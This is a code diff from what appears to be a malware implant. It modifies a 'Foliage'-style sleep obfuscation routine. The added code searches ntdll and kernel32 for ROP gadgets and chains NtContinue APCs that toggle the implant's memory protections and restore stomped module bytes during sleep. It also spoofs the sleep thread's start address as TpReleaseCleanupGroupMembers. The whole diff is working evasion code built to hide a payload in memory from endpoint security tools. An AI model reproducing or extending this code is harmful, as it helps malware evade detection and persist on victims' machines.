@@ -2,6 +2,8 @@
 #include <common.h>
 #include <constexpr.h>
 
+#define MODULE_SIZE(x)      ((PIMAGE_NT_HEADERS)((UINT_PTR)x + ((PIMAGE_DOS_HEADER)x)->e_lfanew))->OptionalHeader.SizeOfImage
+
 FUNC VOID volatile ___chkstk_ms(
         VOID
 ) { __asm__( "nop" ); }
@@ -57,7 +59,22 @@ FUNC VOID SleepMain(
     FoliageObf( SleepTime );
 }
 
-#define BK_STOMP
+FUNC LPVOID lpGetGadgetlpNtTestAlert(
+    _In_ LPVOID ModuleBase
+) {
+    BLACKOUT_INSTANCE
+    // pattern of "CALL ZwTestAlert" gadget
+    BYTE Pattern[] = { 0x48, 0x83, 0xEC, 0x28, 0xF7, 0x41, 0x04, 0x66, 0x00, 0x00, 0x00, 0x74, 0x05 };
+
+    for (SIZE_T i = 0; i < 0x1000*0x1000; i++) {
+        if (Instance()->Win32.RtlCompareMemory( B_PTR( ModuleBase ) + i, Pattern, sizeof( Pattern ) ) == 0) {
+            return (UINT_PTR)ModuleBase + i + 0xd;
+        }
+    }
+
+    return NULL;
+}
+
 #ifdef BK_STOMP
 FUNC VOID FoliageObf( 
     DWORD SleepTime
@@ -78,6 +95,11 @@ FUNC VOID FoliageObf(
     HMODULE hLibraryFr = Instance()->Win32.GetModuleHandleA( LibraryFr );        // todo: get module using LdrModuleAddr | discover hash of the chacrka.dll
     PVOID   OldProt    = NULL;
 
+    PVOID  NtTestAlertGdgt = lpGetGadgetlpNtTestAlert( Instance()->Modules.Ntdll );
+    PVOID  JmpGadget = FindGadget( Instance()->Modules.Kernel32 );
+    BK_PRINT( "[I] Using Rbx gadget @ 0x%p\n", JmpGadget );
+
+    
     CONTEXT CtxMain   = { 0 };
     CONTEXT CtxBackup = { 0 };
     CONTEXT CtxSpoof  = { 0 };
@@ -91,7 +113,6 @@ FUNC VOID FoliageObf(
     CONTEXT RopDelay  = { 0 };
     CONTEXT RopImpBcp = { 0 };
     CONTEXT RopProtRw = { 0 };
-    CONTEXT RopImpZer = { 0 };
     CONTEXT RopProtRx = { 0 };
     CONTEXT RopSetBkp = { 0 };
     CONTEXT RopExit   = { 0 };
@@ -99,18 +120,16 @@ FUNC VOID FoliageObf(
     Status = Instance()->Win32.NtCreateEvent( &EvtSync, EVENT_ALL_ACCESS, NULL, SynchronizationEvent, FALSE );
     if ( Status != 0x00 ) { __debugbreak; return; }    
 
-    Status = Instance()->Win32.NtCreateThreadEx( &hSlpThread, THREAD_ALL_ACCESS, NULL, NtCurrentProcess(), NULL, NULL, TRUE, 0, 0x1000 * 20, 0x1000 * 20, NULL );
+    Status = Instance()->Win32.NtCreateThreadEx( &hSlpThread, THREAD_ALL_ACCESS, NULL, NtCurrentProcess(), Instance()->Win32.TpReleaseCleanupGroupMembers, NULL, TRUE, 0, 0x1000 * 20, 0x1000 * 20, NULL );
     if ( Status != 0x00 ) { __debugbreak; return; }
 
     Instance()->Win32.printf( "[I] Obf chain thread at tid: %d\n", hSlpThread );
-
-    //Instance()->Win32.DuplicateHandle( NtCurrentProcess(), NtCurrentThread(), NtCurrentProcess(), &hMainThread, THREAD_ALL_ACCESS, TRUE, 0 );
 
     CtxMain.ContextFlags = CONTEXT_FULL;
     Status = Instance()->Win32.NtGetContextThread( hSlpThread, &CtxMain );
     if ( Status != 0x00 ) { __debugbreak; return; }
 
-    *(PVOID*)CtxMain.Rsp = Instance()->Win32.NtTestAlert;
+    *(PVOID*)CtxMain.Rsp = Instance()->Win32.NtTestAlert;//0x00007FFE7FC044B3;
 
     MmCopy( &RopSetEvt, &CtxMain, sizeof( CONTEXT ) );
     MmCopy( &RopMapBkp, &CtxMain, sizeof( CONTEXT ) );
@@ -119,7 +138,6 @@ FUNC VOID FoliageObf(
     MmCopy( &RopFdsZzz, &CtxMain, sizeof( CONTEXT ) );
     MmCopy( &RopDelay,  &CtxMain, sizeof( CONTEXT ) );
     MmCopy( &RopProtRx, &CtxMain, sizeof( CONTEXT ) );
-    MmCopy( &RopImpZer, &CtxMain, sizeof( CONTEXT ) );
     MmCopy( &RopGetBkp, &CtxMain, sizeof( CONTEXT ) );
     MmCopy( &RopSetBkp, &CtxMain, sizeof( CONTEXT ) );
     MmCopy( &RopProtRw, &CtxMain, sizeof( CONTEXT ) );
@@ -144,39 +162,29 @@ FUNC VOID FoliageObf(
     RopLoadLb.Rdx = NULL;
     RopLoadLb.R8  = DONT_RESOLVE_DLL_REFERENCES;
 
-    RopGetBkp.Rip = Instance()->Win32.NtGetContextThread;
-    RopGetBkp.Rcx = hMainThread;
-    RopGetBkp.Rdx = &CtxBackup;
-
     RopDelay.Rip = Instance()->Win32.WaitForSingleObjectEx;
     RopDelay.Rcx = NtCurrentProcess();
     RopDelay.Rdx = SleepTime;
     RopDelay.R8  = FALSE;
 
-    RopProtRw.Rip = Instance()->Win32.VirtualProtect;
+    RopProtRw.Rip = JmpGadget;
+    RopProtRw.Rbx = &Instance()->Win32.VirtualProtect;
     RopProtRw.Rcx = Instance()->Base.Buffer;
     RopProtRw.Rdx = Instance()->Base.FullLen;
     RopProtRw.R8  = PAGE_READWRITE;
-    RopProtRw.R9  = &OldProt; 
-
-    RopImpZer.Rip = Instance()->Win32.RtlZeroMemory;
-    RopImpZer.Rcx = Instance()->Base.Buffer;
-    RopImpZer.Rdx = Instance()->Base.FullLen;
+    RopProtRw.R9  = &OldProt;
 
     RopImpBcp.Rip = Instance()->Win32.RtlCopyMemory;
     RopImpBcp.Rcx = Instance()->Base.Buffer;
     RopImpBcp.Rdx = Instance()->StompArgs->Backup;
     RopImpBcp.R8  = Instance()->StompArgs->Length;
 
-    RopProtRx.Rip = Instance()->Win32.VirtualProtect;
+    RopProtRx.Rip = JmpGadget;
+    RopProtRx.Rbx = &Instance()->Win32.VirtualProtect;
     RopProtRx.Rcx = Instance()->Base.RxBase;
     RopProtRx.Rdx = Instance()->Base.RxSize;
     RopProtRx.R8  = PAGE_EXECUTE_READ;
     RopProtRx.R9  = &OldProt;
-    
-    RopSetBkp.Rip = Instance()->Win32.NtSetContextThread;
-    RopSetBkp.Rcx = hMainThread;
-    RopSetBkp.Rdx = &CtxBackup;
 
     RopExit.Rip = Instance()->Win32.RtlExitUserThread;
     RopExit.Rcx = 0x00;
@@ -185,13 +193,10 @@ FUNC VOID FoliageObf(
     Instance()->Win32.NtQueueApcThread( hSlpThread, Instance()->Win32.NtContinue, &RopMapBkp, FALSE, NULL );
     Instance()->Win32.NtQueueApcThread( hSlpThread, Instance()->Win32.NtContinue, &RopFreeLb, FALSE, NULL );
     Instance()->Win32.NtQueueApcThread( hSlpThread, Instance()->Win32.NtContinue, &RopLoadLb, FALSE, NULL );
-    Instance()->Win32.NtQueueApcThread( hSlpThread, Instance()->Win32.NtContinue, &RopGetBkp, FALSE, NULL );
     Instance()->Win32.NtQueueApcThread( hSlpThread, Instance()->Win32.NtContinue, &RopDelay , FALSE, NULL );
     Instance()->Win32.NtQueueApcThread( hSlpThread, Instance()->Win32.NtContinue, &RopProtRw, FALSE, NULL );
-    Instance()->Win32.NtQueueApcThread( hSlpThread, Instance()->Win32.NtContinue, &RopImpZer, FALSE, NULL );
     Instance()->Win32.NtQueueApcThread( hSlpThread, Instance()->Win32.NtContinue, &RopImpBcp, FALSE, NULL );
     Instance()->Win32.NtQueueApcThread( hSlpThread, Instance()->Win32.NtContinue, &RopProtRx, FALSE, NULL );
-    Instance()->Win32.NtQueueApcThread( hSlpThread, Instance()->Win32.NtContinue, &RopSetBkp, FALSE, NULL );
     Instance()->Win32.NtQueueApcThread( hSlpThread, Instance()->Win32.NtContinue, &RopExit  , FALSE, NULL );
 
     Status = Instance()->Win32.NtAlertResumeThread( hSlpThread, NULL );
